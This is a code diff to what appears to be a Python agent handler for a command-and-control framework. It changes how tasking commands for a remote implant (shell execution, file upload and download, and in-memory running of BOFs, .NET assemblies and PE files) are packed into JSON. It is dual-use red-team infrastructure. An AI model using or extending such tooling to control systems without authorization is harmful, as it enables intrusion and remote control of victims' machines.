@@ -24,20 +24,11 @@ class CommandShell(Command):
         #AesKey = base64.b64decode(arguments["__meta_AesKey"])
         #AesIV = base64.b64decode(arguments["__meta_AesIV"])
 
-        packer.add_data("shell "+arguments["commands"])
-        return packer.buffer
-        '''
-        task_id = int(arguments["TaskID"], 16)
-        job = TaskJob(
-            command=self.CommandId,
-            task_id=task_id,
-            data=packer.buffer.decode('utf-8'),
-            aes_key=AesKey,
-            aes_iv=AesIV
-        )
+        data = {"TaskCommand":"shell", "TaskFile":"", "TaskArguments":arguments["commands"].rstrip()}
+        json_string = json.dumps(data, indent=4)
+        packer.add_data(json_string)
+        return packer.buffer[:-1]
 
-        return job.generate()[4:]
-        '''
 
 class CommandExit(Command):
     Name        = "exit"
@@ -49,9 +40,11 @@ class CommandExit(Command):
 
     def job_generate( self, arguments: dict ) -> bytes:
 
-        Task = Packer()
-        Task.add_data("goodbye")
-        return Task.buffer #Queue "goodbye" as a tasking. Easy!
+        packer = Packer()
+        data = {"TaskCommand":"exit", "TaskFile":"", "TaskArguments":""}
+        json_string = json.dumps(data, indent=4)
+        packer.add_data(json_string)
+        return packer.buffer[:-1]
 
 class CommandSleep(Command):
     Name        = "sleep"
@@ -71,13 +64,11 @@ class CommandSleep(Command):
         print("[*] job generate")
         packer = Packer()
 
-        #AesKey = base64.b64decode(arguments["__meta_AesKey"])
-        #AesIV = base64.b64decode(arguments["__meta_AesIV"])
+        data = {"TaskCommand":"sleep", "TaskFile":"", "TaskArguments":arguments["sleeptime"].rstrip()}
+        json_string = json.dumps(data, indent=4)
+        packer.add_data(json_string)
+        return packer.buffer[:-1]
 
-        #commands = "/C " + arguments["commands"]
-        #packer.add_data(commands)
-        packer.add_data("sleep "+arguments["sleeptime"])
-        return packer.buffer
 class CommandLs(Command):
     Name        = "ls"
     Description = "List directories"
@@ -96,8 +87,11 @@ class CommandLs(Command):
         print("[*] job generate")
         packer = Packer()
 
-        packer.add_data("ls "+arguments["path"])
-        return packer.buffer
+        data = {"TaskCommand":"ls", "TaskFile":"", "TaskArguments":arguments["path"].rstrip()}
+        json_string = json.dumps(data, indent=4)
+        packer.add_data(json_string)
+        return packer.buffer[:-1]
+
 class CommandUpload(Command):
     Name        = "upload"
     Description = "Upload a file. Need to specify full path to destination."
@@ -120,8 +114,12 @@ class CommandUpload(Command):
     def job_generate(self, arguments: dict) -> bytes:
         print("[*] job generate")
         packer = Packer()
-        packer.add_data("upload remote_dest="+arguments["remote_path"]+";"+arguments["local_file"])
-        return packer.buffer
+        
+        data = {"TaskCommand":"upload", "TaskFile":arguments["local_file"], "TaskArguments":arguments["remote_path"].rstrip()}
+        json_string = json.dumps(data, indent=4)
+        packer.add_data(json_string)
+        return packer.buffer[:-1]
+
 class CommandDownload(Command):
     Name        = "download"
     Description = "Download a file. Need to specify full path to destination."
@@ -139,10 +137,10 @@ class CommandDownload(Command):
     def job_generate(self, arguments: dict) -> bytes:
         print("[*] job generate")
         packer = Packer()
-        #AesKey = base64.b64decode(arguments["__meta_AesKey"])
-        #AesIV = base64.b64decode(arguments["__meta_AesIV"])
-        packer.add_data("download remote_dest="+arguments["remote_path"])
-        return packer.buffer
+        data = {"TaskCommand":"download", "TaskFile":"", "TaskArguments":arguments["remote_path"].rstrip()}
+        json_string = json.dumps(data, indent=4)
+        packer.add_data(json_string)
+        return packer.buffer[:-1]
 class CommandBofExec(Command):
     Name        = "bofexec"
     Description = "Run a bof. Need to specify full path to destination. No command line arg support for now."
@@ -161,10 +159,11 @@ class CommandBofExec(Command):
         print("[*] job generate")
         packer = Packer()
 
-        #AesKey = base64.b64decode(arguments["__meta_AesKey"])
-        #AesIV = base64.b64decode(arguments["__meta_AesIV"])
-        packer.add_data("bofexec "+ arguments["local_bof"])
-        return packer.buffer
+        data = {"TaskCommand":"bofexec", "TaskFile":arguments["local_bof"], "TaskArguments":""} #, "TaskArguments":arguments["args"].rstrip()}
+        json_string = json.dumps(data, indent=4)
+        packer.add_data(json_string)
+        return packer.buffer[:-1]
+        
 class CommandInlineAssembly(Command):
     Name        = "inline_assembly"
     Description = "Run a .NET assembly in process. Need to specify full path to destination. No command line arg support for now."
@@ -188,10 +187,10 @@ class CommandInlineAssembly(Command):
         print("[*] job generate")
         packer = Packer()
 
-        #AesKey = base64.b64decode(arguments["__meta_AesKey"])
-        #AesIV = base64.b64decode(arguments["__meta_AesIV"])
-        packer.add_data("inline_assembly file="+ arguments["local_assembly"]+";"+arguments["args"])
-        return packer.buffer
+        data = {"TaskCommand":"inline_assembly", "TaskFile":arguments["local_assembly"], "TaskArguments":arguments["args"].rstrip()}
+        json_string = json.dumps(data, indent=4)
+        packer.add_data(json_string)
+        return packer.buffer[:-1]
 class CommandInlinePE(Command):
     Name        = "inline_pe"
     Description = "Run a x64 PE in memory. Need to specify full path to destination."
@@ -215,10 +214,11 @@ class CommandInlinePE(Command):
         print("[*] job generate")
         packer = Packer()
 
-        #AesKey = base64.b64decode(arguments["__meta_AesKey"])
-        #AesIV = base64.b64decode(arguments["__meta_AesIV"])
-        packer.add_data("inline_pe file="+ arguments["local_exe"]+";"+arguments["args"])
-        return packer.buffer
+        data = {"TaskCommand":"inline_pe", "TaskFile":arguments["local_exe"], "TaskArguments":arguments["args"].rstrip()}
+        json_string = json.dumps(data, indent=4)
+        packer.add_data(json_string)
+        return packer.buffer[:-1]
+
 class Sharp(AgentType):
     Name = "Sharp"
     Author = "@smallbraintranman"
